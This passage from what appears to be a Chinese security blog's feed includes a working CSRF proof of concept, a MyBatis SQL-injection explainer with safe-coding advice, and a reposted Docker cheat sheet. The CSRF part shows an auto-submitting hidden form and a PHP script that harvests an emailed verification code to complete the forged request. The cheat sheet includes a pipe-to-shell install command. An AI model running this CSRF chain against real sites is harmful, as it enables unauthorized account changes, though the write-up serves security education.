    <span class="tag">&lt;<span class="title">form</span> <span class="attribute">id</span>=<span class="value">"form1"</span> <span class="attribute">action</span>=<span class="value">"http://xxxxxxxxxxx/security"</span> <span class="attribute">method</span>=<span class="value">"POST"</span> <span class="attribute">target</span>=<span class="value">"csrfIframe1"</span>&gt;</span>
    <span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"hidden"</span> <span class="attribute">name</span>=<span class="value">"email"</span> <span class="attribute">value</span>=<span class="value">"邮箱@qq.com"</span> /&gt;</span>
<span class="tag">&lt;/<span class="title">form</span>&gt;</span>
<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">
<span class="built_in">document</span>.getElementById(<span class="string">"form1"</span>).submit();
</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
<span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">style</span>=<span class="value">"display: hidden"</span> <span class="attribute">height</span>=<span class="value">"100"</span> <span class="attribute">width</span>=<span class="value">"100"</span> <span class="attribute">frameborder</span>=<span class="value">"0"</span> <span class="attribute">name</span>=<span class="value">"csrfIframe22"</span> <span class="attribute">src</span>=<span class="value">"http://localhost/test/mail.php"</span>&gt;</span><span class="tag">&lt;/<span class="title">iframe</span>&gt;</span>
<span class="tag">&lt;/<span class="title">body</span>&gt;</span>
<span class="tag">&lt;/<span class="title">html</span>&gt;</span>
</code></pre><p>文件2：iframe的文件需要去邮箱获取验证码拼到表单里。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;?php&#10;$mail = &#39;mail@qq.com&#39;;&#10;$mailPass = &#39;pass&#39;;&#10;// sleep(5);&#10;//&#20197;&#33150;&#35759;&#20225;&#19994;&#37038;&#31665;&#20570;&#20102;&#27979;&#35797;&#10;$mailServer=&#34;imap.qq.com&#34;; //IMAP&#20027;&#26426;&#10;$mailLink=&#34;&#123;&#123;$mailServer&#125;:993/ssl&#125;INBOX&#34; ; //imagp&#36830;&#25509;&#22320;&#22336;&#65306;&#19981;&#21516;&#20027;&#26426;&#22320;&#22336;&#19981;&#21516;&#10;$mailUser = $mail; //&#37038;&#31665;&#29992;&#25143;&#21517;&#10;//&#37038;&#31665;&#23494;&#30721;&#10;$mbox = imap_open($mailLink,$mailUser,$mailPass) or die(&#34;can&#39;t connect: &#34; . imap_last_error()); //&#24320;&#21551;&#20449;&#31665;imap_open&#10;$totalrows = imap_num_msg($mbox);&#10;// echo $totalrows;//&#21462;&#24471;&#20449;&#20214;&#25968;&#10;$numcode = &#39;&#39;;&#10;// $headers = imap_fetchheader($mbox, $i); //&#33719;&#21462;&#20449;&#20214;&#26631;&#22836;&#10;// echo $headers;&#10;// $headArr = matchMailHead($headers); //&#21305;&#37197;&#20449;&#20214;&#26631;&#22836;&#10;// var_dump($headArr);&#10;$mailBody = imap_fetchbody($mbox, $totalrows, 1); //&#33719;&#21462;&#26368;&#26032;&#30340;&#19968;&#23553;&#21491;&#38190;&#10;$mailBody = base64_decode($mailBody);&#10;preg_match(&#39;/\d&#123;6&#125;/&#39;,$mailBody,$res);//&#21305;&#37197;&#39564;&#35777;&#30721;&#10;// print_r($res); //&#33719;&#21462;&#20449;&#20214;&#27491;&#25991;&#10;// echo $res[0];&#10;$numcode = $res[0];&#10;echo $numcode;&#10;$form2 = &#39;&#60;html&#62;&#10;&#60;body&#62;&#10;&#60;form id=&#34;form2&#34; action=&#34;http:xxxxxx&#34; method=&#34;POST&#34; target=&#34;csrfIframe2&#34;&#62;&#10;&#60;input type=&#34;hidden&#34; name=&#34;captchacode&#34; value=&#34;&#39;.$numcode.&#39;&#34; /&#62;&#10;&#60;input type=&#34;hidden&#34; name=&#34;email&#34; value=&#34;&#39;.$mail.&#39;&#34; /&#62;&#10;&#60;/form&#62;&#10;&#60;script&#62;&#10;document.getElementById(&#34;form2&#34;).submit();&#60;/script&#62;&#10;&#60;/body&#62;&#10;&#60;/html&#62;&#39;;&#10;echo $form2;</span><br></pre></td></tr></table></figure></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>发布在了<a href="http://www.freebuf.com/articles/web/58387.html" target="_blank" rel="external">Freebuf</a>上，有删改。</p>
<p>CSRF的漏洞原理和利用方式这里就不多赘]]>
    </summary>
    
      <category term="csrf" scheme="http://xdxd.love/tags/csrf/"/>
    
      <category term="前端安全" scheme="http://xdxd.love/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[mybatis与sql注入]]></title>
    <link href="http://xdxd.love/2015/12/23/mybatis%E4%B8%8Esql%E6%B3%A8%E5%85%A5/"/>
    <id>http://xdxd.love/2015/12/23/mybatis与sql注入/</id>
    <published>2015-12-23T06:38:51.000Z</published>
    <updated>2015-12-25T07:10:58.000Z</updated>
    <content type="html"><![CDATA[<p>MyBatis 是支持定制化 SQL、存储过程以及高级映射的优秀的持久层框架。MyBatis 避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集。MyBatis 可以对配置和原生Map使用简单的 XML 或注解，将接口和 Java 的 POJOs(Plain Old Java Objects,普通的 Java对象)映射成数据库中的记录。通常来说ORM的框架应该是可以避免SQL注入的，但是如果mybatis使用不当也会造成sql注入。</p>
<p>The MyBatis data mapper framework makes it easier to use a relational database with object-oriented applications. Unlike traditional ORM solutions, MyBatis maps objects with SQL statements or stored procedures using a XML descriptor, rather than mapping objects to tables in a database; thus providing complete control over SQL, therefore susceptible to SQL injection if used incorrectly.</p>
<p>MyBatis has 2 substitution methods. The <code>${}</code> method does direct string replacement (i.e. property substitution) so it’s vulnerable to SQL injection. The <code>#{}</code> method does parameter substitution on a PreparedStatement so it is not vulnerable.</p>
<pre><code>&lt;<span class="keyword">select</span> id=<span class="string">"getPerson"</span> parameterType=<span class="string">"int"</span> resultType=<span class="string">"org.application.vo.Person"</span>&gt;
<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> PERSON <span class="keyword">WHERE</span> ID = <span class="preprocessor">#{id}</span>
&lt;/<span class="keyword">select</span>&gt;
</code></pre><p>使用<code>#</code>标记参数，mybatis会使用预编译的方式来处理参数，这样子是安全的。相当于使用了如下的jdbc代码：</p>
<figure class="highlight"><figcaption><span>Comparable JDBC code */</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String selectPerson = &#34;SELECT * FROM PERSON WHERE ID = ?&#34;; &#10;PreparedStatement ps = conn.prepareStatement(selectPerson); &#10;ps.setInt(1, id);</span><br></pre></td></tr></table></figure>
<pre><code>&lt;<span class="keyword">select</span> id=<span class="string">"getPerson"</span> parameterType=<span class="string">"string"</span> resultType=<span class="string">"org.application.vo.Person"</span>&gt;
<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> PERSON <span class="keyword">WHERE</span> NAME = <span class="preprocessor">#{name} AND PHONE LIKE '${phone}'; </span>
&lt;/<span class="keyword">select</span>&gt;   
</code></pre><p>Note the parameter notation, ${phone} in the above getPerson statement. By default, using the ${} syntax will cause MyBatis to directly inject a string, unmodified, into a SQL Statement. MyBatis does NOT modify or escape the string before substitution.</p>
<p>使用<code>$</code>符号mybatis会直接将字符串注入到sql语句中，不进行任何修改和转移如果没有对phone变量进行验证的话就可能导致sql注入。</p>
<p>#安全开发建议</p>
<p>尽量使用<code>#</code>符号，如果需要要对用户提交参数进行验证。</p>
<p>like的写法：</p>
<p>mysql：</p>
<pre><code><span class="operator"><span class="keyword">select</span> * <span class="keyword">from</span> t_user <span class="keyword">where</span> <span class="keyword">name</span> <span class="keyword">like</span> <span class="keyword">concat</span>(<span class="string">'%'</span>, #{<span class="keyword">name</span>}, <span class="string">'%'</span>)  </span>
</code></pre><p>oracle：</p>
<pre><code><span class="operator"><span class="keyword">select</span> * <span class="keyword">from</span> t_user <span class="keyword">where</span> <span class="keyword">name</span> <span class="keyword">like</span> <span class="string">'%'</span> || #{<span class="keyword">name</span>} || <span class="string">'%'</span></span>
</code></pre><p>sqlserver:</p>
<pre><code><span class="operator"><span class="keyword">select</span> * <span class="keyword">from</span> t_user <span class="keyword">where</span> <span class="keyword">name</span> <span class="keyword">like</span> <span class="string">'%'</span> + #{<span class="keyword">name</span>} + <span class="string">'%'</span></span>
</code></pre><p>参考资料：</p>
<p><a href="http://apollo89.com/wordpress/?p=2175" target="_blank" rel="external">http://apollo89.com/wordpress/?p=2175</a><br><a href="http://mybatis.org/mybatis-3/zh/" target="_blank" rel="external">http://mybatis.org/mybatis-3/zh/</a><br><a href="http://software-security.sans.org/developer-how-to/fix-sql-injection-in-java-mybatis" target="_blank" rel="external">http://software-security.sans.org/developer-how-to/fix-sql-injection-in-java-mybatis</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>MyBatis 是支持定制化 SQL、存储过程以及高级映射的优秀的持久层框架。MyBatis 避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集。MyBatis 可以对配置和原生Map使用简单的 XML 或注解，将接口和 Java 的 POJOs(Plain Ol]]>
    </summary>
    
      <category term="java" scheme="http://xdxd.love/tags/java/"/>
    
      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[docker cheat sheet]]></title>
    <link href="http://xdxd.love/2015/12/23/docker-cheat-sheet/"/>
    <id>http://xdxd.love/2015/12/23/docker-cheat-sheet/</id>
    <published>2015-12-23T01:50:53.000Z</published>
    <updated>2015-12-23T01:51:45.000Z</updated>
    <content type="html"><![CDATA[<p><a href="https://github.com/wsargent/docker-cheat-sheet" target="_blank" rel="external">github</a></p>
<h1 id="Docker_Cheat_Sheet">Docker Cheat Sheet</h1><p>NOTE: This used to be a gist that continually expanded.  It’s now a GitHub project because it’s considerably easier for other people to edit, fix and expand on Docker using Github.  Just click  <a href="https://github.com/wsargent/docker-cheat-sheet/blob/master/README.md" target="_blank" rel="external">README.md</a>, and then on the “writing pen” icon on the right to edit.</p>
<ul>
<li><a href="#why">Why</a></li>
<li><a href="#prerequisites">Prerequisites</a></li>
<li><a href="#installation">Installation</a></li>
<li><a href="#containers">Containers</a></li>
<li><a href="#images">Images</a></li>
<li><a href="#registry--repository">Registry and Repository</a></li>
<li><a href="#dockerfile">Dockerfile</a></li>
<li><a href="#layers">Layers</a></li>
<li><a href="#links">Links</a></li>
<li><a href="#volumes">Volumes</a></li>
<li><a href="#exposing-ports">Exposing Ports</a></li>
<li><a href="#best-practices">Best Practices</a></li>
<li><a href="#security">Security</a></li>
<li><a href="#tips">Tips</a></li>
</ul>
<h2 id="Why">Why</h2><p>“With Docker, developers can build any app in any language using any toolchain. “Dockerized” apps are completely portable and can run anywhere - colleagues’ OS X and Windows laptops, QA servers running Ubuntu in the cloud, and production data center VMs running Red Hat.</p>
<p>Developers can get going quickly by starting with one of the 13,000+ apps available on Docker Hub. Docker manages and tracks changes and dependencies, making it easier for sysadmins to understand how the apps that developers build work. And with Docker Hub, developers can automate their build pipeline and share artifacts with collaborators through public or private repositories.</p>
<p>Docker helps developers build and ship higher-quality applications, faster.” – <a href="https://www.docker.com/whatisdocker/#copy1" target="_blank" rel="external">What is Docker</a></p>
<h2 id="Prerequisites">Prerequisites</h2><p>I use <a href="https://github.com/robbyrussell/oh-my-zsh" target="_blank" rel="external">Oh My Zsh</a> with the <a href="https://github.com/robbyrussell/oh-my-zsh/wiki/Plugins#docker" target="_blank" rel="external">Docker plugin</a> for autocompletion of docker commands.  YMMV.</p>
<h3 id="Linux">Linux</h3><p>The 3.10.x kernel is <a href="https://docs.docker.com/installation/binaries/#check-kernel-dependencies" target="_blank" rel="external">the minimum requirement</a> for Docker.</p>
<h3 id="MacOS">MacOS</h3><p> 10.8 “Mountain Lion” or newer is required.</p>
<h2 id="Installation">Installation</h2><h3 id="Linux-1">Linux</h3><p>Quick and easy install script provided by Docker:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure>
<p>If you’re not willing to run a random shell script, please see the <a href="https://docs.docker.com/installation/" target="_blank" rel="external">installation</a> instructions for your distribution.  </p>
<p>If you are a complete Docker newbie, you should follow the <a href="https://docs.docker.com/linux/started/" target="_blank" rel="external">series of tutorials</a> now.</p>
<h3 id="Mac_OS_X">Mac OS X</h3><p>Download and install <a href="https://www.docker.com/toolbox" target="_blank" rel="external">Docker Toolbox</a>.  If that doesn’t work, see the <a href="https://docs.docker.com/installation/mac/" target="_blank" rel="external">installation instructions</a>.</p>
<p>Docker used to use boot2docker, but you should be using docker machine now. The Docker website has instructions on <a href="https://docs.docker.com/installation/mac/#migrate-from-boot2docker" target="_blank" rel="external">how to upgrade</a>.  If you have an existing docker instance, you can also install the <a href="https://docs.docker.com/machine/install-machine/" target="_blank" rel="external">Docker Machine</a> binaries directly.</p>
<p>Once you’ve installed Docker Toolbox, install a VM with Docker Machine using the VirtualBox provider:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-machine create --driver=virtualbox default&#10;docker-machine ls&#10;eval &#34;$(docker-machine env default)&#34;</span><br></pre></td></tr></table></figure>
<p>Then start up a container:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure>
<p>That’s it, you have a running Docker container. </p>
<p>If you are a complete Docker newbie, you should probably follow the <a href="https://docs.docker.com/mac/started/" target="_blank" rel="external">series of tutorials</a> now.</p>
<h2 id="Containers">Containers</h2><p><a href="http://etherealmind.com/basics-docker-containers-hypervisors-coreos/" target="_blank" rel="external">Your basic isolated Docker process</a>.  Containers are to Virtual Machines as threads are to processes.  Or you can think of them as chroots on steroids.</p>
<h3 id="Lifecycle">Lifecycle</h3><ul>
<li><a href="https://docs.docker.com/reference/commandline/create" target="_blank" rel="external"><code>docker create</code></a> creates a container but does not start it.</li>
<li><a href="https://docs.docker.com/reference/commandline/run" target="_blank" rel="external"><code>docker run</code></a> creates and starts a container in one operation.</li>
<li><a href="https://docs.docker.com/reference/commandline/stop" target="_blank" rel="external"><code>docker stop</code></a> stops it.</li>
<li><a href="https://docs.docker.com/reference/commandline/start" target="_blank" rel="external"><code>docker start</code></a> will start it again.</li>
<li><a href="https://docs.docker.com/reference/commandline/restart" target="_blank" rel="external"><code>docker restart</code></a> restarts a container.</li>
<li><a href="https://docs.docker.com/reference/commandline/rm" target="_blank" rel="external"><code>docker rm</code></a> deletes a container.</li>
<li><a href="https://docs.docker.com/reference/commandline/kill" target="_blank" rel="external"><code>docker kill</code></a> sends a SIGKILL to a container.</li>
<li><a href="https://docs.docker.com/reference/commandline/attach" target="_blank" rel="external"><code>docker attach</code></a> will connect to a running container.</li>
<li><a href="https://docs.docker.com/reference/commandline/wait" target="_blank" rel="external"><code>docker wait</code></a> blocks until container stops.</li>
</ul>
<p>If you want to run and then interact with a container, <code>docker start</code>, then spawn a shell as described in <a href="https://github.com/wsargent/docker-cheat-sheet/#executing-commands" target="_blank" rel="external">Executing Commands</a>.</p>
<p>If you want a transient container, <code>docker run --rm</code> will remove the container after it stops.</p>
<p>If you want to remove also the volumes associated with the container, the deletion of the container must include the -v switch like in <code>docker rm -v</code>.</p>
<p>If you want to poke around in an image, <code>docker run -t -i &lt;myimage&gt; &lt;myshell&gt;</code> to open a tty.</p>
<p>If you want to poke around in a running container, <code>docker exec -t -i &lt;mycontainer&gt; &lt;myshell&gt;</code> to open a tty.</p>
<p>If you want to map a directory on the host to a docker container, <code>docker run -v $HOSTDIR:$DOCKERDIR</code>.  Also see <a href="https://github.com/wsargent/docker-cheat-sheet/#volumes" target="_blank" rel="external">Volumes</a>.</p>
<p>If you want to integrate a container with a <a href="https://docs.docker.com/articles/host_integration/" target="_blank" rel="external">host process manager</a>, start the daemon with <code>-r=false</code> then use <code>docker start -a</code>.</p>
<p>If you want to expose container ports through the host, see the <a href="#exposing-ports">exposing ports</a> section.</p>
<p>Restart policies on crashed docker instances are <a href="http://container42.com/2014/09/30/docker-restart-policies/" target="_blank" rel="external">covered here</a>.</p>
<h3 id="Info">Info</h3><ul>
<li><a href="https://docs.docker.com/reference/commandline/ps" target="_blank" rel="external"><code>docker ps</code></a> shows running containers.</li>
<li><a href="https://docs.docker.com/reference/commandline/logs" target="_blank" rel="external"><code>docker logs</code></a> gets logs from container.</li>
<li><a href="https://docs.docker.com/reference/commandline/inspect" target="_blank" rel="external"><code>docker inspect</code></a> looks at all the info on a container (including IP address).</li>
<li><a href="https://docs.docker.com/reference/commandline/events" target="_blank" rel="external"><code>docker events</code></a> gets events from container.</li>
<li><a href="https://docs.docker.com/reference/commandline/port" target="_blank" rel="external"><code>docker port</code></a> shows public facing port of container.</li>
<li><a href="https://docs.docker.com/reference/commandline/top" target="_blank" rel="external"><code>docker top</code></a> shows running processes in container.</li>
<li><a href="https://docs.docker.com/reference/commandline/stats" target="_blank" rel="external"><code>docker stats</code></a> shows containers’ resource usage statistics.</li>
<li><a href="https://docs.docker.com/reference/commandline/diff" target="_blank" rel="external"><code>docker diff</code></a> shows changed files in the container’s FS.</li>
</ul>
<p><code>docker ps -a</code> shows running and stopped containers.</p>
<h3 id="Import_/_Export">Import / Export</h3><ul>
<li><a href="https://docs.docker.com/reference/commandline/cp" target="_blank" rel="external"><code>docker cp</code></a> copies files or folders between a container and the local filesystem..</li>
<li><a href="https://docs.docker.com/reference/commandline/export" target="_blank" rel="external"><code>docker export</code></a> turns container filesystem into tarball archive stream to STDOUT.</li>
</ul>
<h3 id="Executing_Commands">Executing Commands</h3><ul>
<li><a href="https://docs.docker.com/reference/commandline/exec" target="_blank" rel="external"><code>docker exec</code></a> to execute a command in container.</li>
</ul>
<p>To enter a running container, attach a new shell process to a running container called foo, use: <code>docker exec -it foo /bin/bash</code>.</p>
<h2 id="Images">Images</h2><p>Images are just <a href="https://docs.docker.com/introduction/understanding-docker/#how-does-a-docker-image-work" target="_blank" rel="external">templates for docker containers</a>.</p>
<h3 id="Lifecycle-1">Lifecycle</h3><ul>
<li><a href="https://docs.docker.com/reference/commandline/images" target="_blank" rel="external"><code>docker images</code></a> shows all images.</li>
<li><a href="https://docs.docker.com/reference/commandline/import" target="_blank" rel="external"><code>docker import</code></a> creates an image from a tarball.</li>
<li><a href="https://docs.docker.com/reference/commandline/build" target="_blank" rel="external"><code>docker build</code></a> creates image from Dockerfile.</li>
<li><a href="https://docs.docker.com/reference/commandline/commit" target="_blank" rel="external"><code>docker commit</code></a> creates image from a container.</li>
<li><a href="https://docs.docker.com/reference/commandline/rmi" target="_blank" rel="external"><code>docker rmi</code></a> removes an image.</li>
<li><a href="https://docs.docker.com/reference/commandline/load" target="_blank" rel="external"><code>docker load</code></a> loads an image from a tar archive as STDIN, including images and tags (as of 0.7).</li>
<li><a href="https://docs.docker.com/reference/commandline/save" target="_blank" rel="external"><code>docker save</code></a> saves an image to a tar archive stream to STDOUT with all parent layers, tags &amp; versions (as of 0.7).</li>
</ul>
<h3 id="Info-1">Info</h3><ul>
<li><a href="https://docs.docker.com/reference/commandline/history" target="_blank" rel="external"><code>docker history</code></a> shows history of image.</li>
<li><a href="https://docs.docker.com/reference/commandline/tag" target="_blank" rel="external"><code>docker tag</code></a> tags an image to a name (local or registry).</li>
</ul>
<h2 id="Registry_&amp;_Repository">Registry &amp; Repository</h2><p>A repository is a <em>hosted</em> collection of tagged images that together create the file system for a container.</p>
<p>A registry is a <em>host</em> – a server that stores repositories and provides an HTTP API for <a href="https://docs.docker.com/userguide/dockerrepos/" target="_blank" rel="external">managing the uploading and downloading of repositories</a>.</p>
<p>Docker.com hosts its own <a href="https://registry.hub.docker.com/" target="_blank" rel="external">index</a> to a central registry which contains a large number of repositories.  Having said that, the central docker registry <a href="https://titanous.com/posts/docker-insecurity" target="_blank" rel="external">does not do a good job of verifying images</a> and should be avoided if you’re worried about security.</p>
<ul>
<li><a href="https://docs.docker.com/reference/commandline/login" target="_blank" rel="external"><code>docker login</code></a> to login to a registry.</li>
<li><a href="https://docs.docker.com/reference/commandline/search" target="_blank" rel="external"><code>docker search</code></a> searches registry for image.</li>
<li><a href="https://docs.docker.com/reference/commandline/pull" target="_blank" rel="external"><code>docker pull</code></a> pulls an image from registry to local machine.</li>
<li><a href="https://docs.docker.com/reference/commandline/push" target="_blank" rel="external"><code>docker push</code></a> pushes an image to the registry from local machine.</li>
</ul>
<h3 id="Run_local_registry">Run local registry</h3><p><a href="https://github.com/docker/docker-registry" target="_blank" rel="external">Registry implementation</a> has an official image for basic setup that can be launched with<br><a href="https://github.com/docker/docker-registry#quick-start" target="_blank" rel="external"><code>docker run -p 5000:5000 registry</code></a><br>Note that this installation does not have any authorization controls. You may use option <code>-P -p 127.0.0.1:5000:5000</code> to limit connections to localhost only.<br>In order to push to this repository tag image with <code>repositoryHostName:5000/imageName</code> then push this tag.</p>
<h2 id="Dockerfile">Dockerfile</h2><p><a href="https://docs.docker.com/reference/builder/" target="_blank" rel="external">The configuration file</a>. Sets up a Docker container when you run <code>docker build</code> on it.  Vastly preferable to <code>docker commit</code>.  If you use <a href="http://jedit.org" target="_blank" rel="external">jEdit</a>, I’ve put up a syntax highlighting module for <a href="https://github.com/wsargent/jedit-docker-mode" target="_blank" rel="external">Dockerfile</a> you can use.  You may also like to try the <a href="#tools">tools section</a>.</p>
<h3 id="Instructions">Instructions</h3><ul>
<li><a href="https://docs.docker.com/reference/builder/#the-dockerignore-file" target="_blank" rel="external">.dockerignore</a></li>
<li><a href="https://docs.docker.com/reference/builder/#from" target="_blank" rel="external">FROM</a></li>
<li><a href="https://docs.docker.com/reference/builder/#maintainer" target="_blank" rel="external">MAINTAINER</a></li>
<li><a href="https://docs.docker.com/reference/builder/#run" target="_blank" rel="external">RUN</a></li>
<li><a href="https://docs.docker.com/reference/builder/#cmd" target="_blank" rel="external">CMD</a></li>
<li><a href="https://docs.docker.com/reference/builder/#expose" target="_blank" rel="external">EXPOSE</a></li>
<li><a href="https://docs.docker.com/reference/builder/#env" target="_blank" rel="external">ENV</a></li>
<li><a href="https://docs.docker.com/reference/builder/#add" target="_blank" rel="external">ADD</a></li>
<li><a href="https://docs.docker.com/reference/builder/#copy" target="_blank" rel="external">COPY</a></li>
<li><a href="https://docs.docker.com/reference/builder/#entrypoint" target="_blank" rel="external">ENTRYPOINT</a></li>
<li><a href="https://docs.docker.com/reference/builder/#volume" target="_blank" rel="external">VOLUME</a></li>
<li><a href="https://docs.docker.com/reference/builder/#user" target="_blank" rel="external">USER</a></li>
<li><a href="https://docs.docker.com/reference/builder/#workdir" target="_blank" rel="external">WORKDIR</a></li>
<li><a href="https://docs.docker.com/reference/builder/#onbuild" target="_blank" rel="external">ONBUILD</a></li>
</ul>
<h3 id="Tutorial">Tutorial</h3><ul>
<li><a href="http://flux7.com/blogs/docker/docker-tutorial-series-part-3-automation-is-the-word-using-dockerfile/" target="_blank" rel="external">Flux7’s Dockerfile Tutorial</a></li>
</ul>
<h2 id="Layers">Layers</h2><p>The versioned filesystem in Docker is based on layers.  They’re like <a href="https://docs.docker.com/terms/layer/" target="_blank" rel="external">git commits or changesets for filesystems</a>.</p>
<p>Note that if you’re using <a href="https://en.wikipedia.org/wiki/Aufs" target="_blank" rel="external">aufs</a> as your filesystem, Docker does not always remove data volumes containers layers when you delete a container!  See <a href="https://github.com/docker/docker/pull/8484" target="_blank" rel="external">PR 8484</a> for more details.</p>
<h2 id="Links">Links</h2><p>Links are how Docker containers talk to each other <a href="https://docs.docker.com/userguide/dockerlinks/" target="_blank" rel="external">through TCP/IP ports</a>.  <a href="https://docs.docker.com/examples/running_redis_service/" target="_blank" rel="external">Linking into Redis</a> and <a href="https://blogs.atlassian.com/2013/11/docker-all-the-things-at-atlassian-automation-and-wiring/" target="_blank" rel="external">Atlassian</a> show worked examples.  You can also (in 0.11) resolve <a href="https://docs.docker.com/userguide/dockerlinks/#updating-the-etchosts-file" target="_blank" rel="external">links by hostname</a>.</p>
<p>NOTE: If you want containers to ONLY communicate with each other through links, start the docker daemon with <code>-icc=false</code> to disable inter process communication.</p>
<p>If you have a container with the name CONTAINER (specified by <code>docker run --name CONTAINER</code>) and in the Dockerfile, it has an exposed port:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXPOSE 1337</span><br></pre></td></tr></table></figure>
<p>Then if we create another container called LINKED like so:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --link CONTAINER:ALIAS --name LINKED user/wordpress</span><br></pre></td></tr></table></figure>
<p>Then the exposed ports and aliases of CONTAINER will show up in LINKED with the following environment variables:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ALIAS_PORT_1337_TCP_PORT&#10;$ALIAS_PORT_1337_TCP_ADDR</span><br></pre></td></tr></table></figure>
<p>And you can connect to it that way.</p>
<p>To delete links, use <code>docker rm --link</code>.</p>
<p>If you want to link across docker hosts then you should look at <a href="https://docs.docker.com/swarm/" target="_blank" rel="external">Swarm</a>. This <a href="https://stackoverflow.com/questions/21283517/how-to-link-docker-services-across-hosts" target="_blank" rel="external">link on stackoverflow</a> provides some good information on different patterns for linking containers across docker hosts.</p>
<h2 id="Volumes">Volumes</h2><p>Docker volumes are <a href="https://docs.docker.com/userguide/dockervolumes/" target="_blank" rel="external">free-floating filesystems</a>.  They don’t have to be connected to a particular container.  You should use volumes mounted from <a href="https://medium.com/@ramangupta/why-docker-data-containers-are-good-589b3c6c749e" target="_blank" rel="external">data-only containers</a> for portability.</p>
<p>Volumes are useful in situations where you can’t use links (which are TCP/IP only).  For instance, if you need to have two docker instances communicate by leaving stuff on the filesystem.</p>
<p>You can mount them in several docker containers at once, using <code>docker run --volumes-from</code>.</p>
<p>Because volumes are isolated filesystems, they are often used to store state from computations between transient containers.  That is, you can have a stateless and transient container run from a recipe, blow it away, and then have a second instance of the transient container pick up from where the last one left off.</p>
<p>See <a href="http://crosbymichael.com/advanced-docker-volumes.html" target="_blank" rel="external">advanced volumes</a> for more details.  Container42 is <a href="http://container42.com/2014/11/03/docker-indepth-volumes/" target="_blank" rel="external">also helpful</a>.</p>
<p>For an easy way to clean abandoned volumes, see <a href="https://github.com/chadoe/docker-cleanup-volumes" target="_blank" rel="external">docker-cleanup-volumes</a></p>
<p>As of 1.3, you can <a href="https://docs.docker.com/userguide/dockervolumes/#mount-a-host-directory-as-a-data-volume" target="_blank" rel="external">map MacOS host directories as docker volumes</a> through boot2docker:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /Users/wsargent/myapp/src:/src</span><br></pre></td></tr></table></figure>
<p>You can also use remote NFS volumes if you’re <a href="http://www.tech-d.net/2014/03/29/docker-quicktip-4-remote-volumes/" target="_blank" rel="external">feeling brave</a>.</p>
<p>You may also consider running data-only containers as described <a href="http://container42.com/2013/12/16/persistent-volumes-with-docker-container-as-volume-pattern/" target="_blank" rel="external">here</a> to provide some data portability.</p>
<h2 id="Exposing_ports">Exposing ports</h2><p>Exposing incoming ports through the host container is <a href="https://docs.docker.com/reference/run/#expose-incoming-ports" target="_blank" rel="external">fiddly but doable</a>.</p>
<p>The fastest way is to map the container port to the host port (only using localhost interface) using <code>-p</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 127.0.0.1:$HOSTPORT:$CONTAINERPORT --name CONTAINER -t someimage</span><br></pre></td></tr></table></figure>
<p>If you don’t want to use the <code>-p</code> option on the command line, you can persist port forwarding by using <a href="https://docs.docker.com/reference/builder/#expose" target="_blank" rel="external">EXPOSE</a>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXPOSE &#60;CONTAINERPORT&#62;</span><br></pre></td></tr></table></figure>
<p>If you’re running Docker in Virtualbox, you then need to forward the port there as well, using <a href="https://docs.vagrantup.com/v2/networking/forwarded_ports.html" target="_blank" rel="external">forwarded_port</a>.  It can be useful to define something in Vagrantfile to expose a range of ports so that you can dynamically map them:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vagrant.configure(VAGRANTFILE_API_VERSION) do |config|&#10;  ...&#10;&#10;  (49000..49900).each do |port|&#10;    config.vm.network :forwarded_port, :host =&#62; port, :guest =&#62; port&#10;  end&#10;&#10;  ...&#10;end</span><br></pre></td></tr></table></figure>
<p>If you forget what you mapped the port to on the host container, use <code>docker port</code> to show it:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker port CONTAINER $CONTAINERPORT</span><br></pre></td></tr></table></figure>
<h3 id="Examples">Examples</h3><ul>
<li><a href="https://docs.docker.com/reference/builder/#dockerfile-examples" target="_blank" rel="external">Examples</a></li>
<li><a href="https://docs.docker.com/articles/dockerfile_best-practices/" target="_blank" rel="external">Best practices for writing Dockerfiles</a></li>
<li><a href="http://crosbymichael.com/" target="_blank" rel="external">Michael Crosby</a> has some more <a href="http://crosbymichael.com/dockerfile-best-practices.html" target="_blank" rel="external">Dockerfiles best practices</a> / <a href="http://crosbymichael.com/dockerfile-best-practices-take-2.html" target="_blank" rel="external">take 2</a>.</li>
</ul>
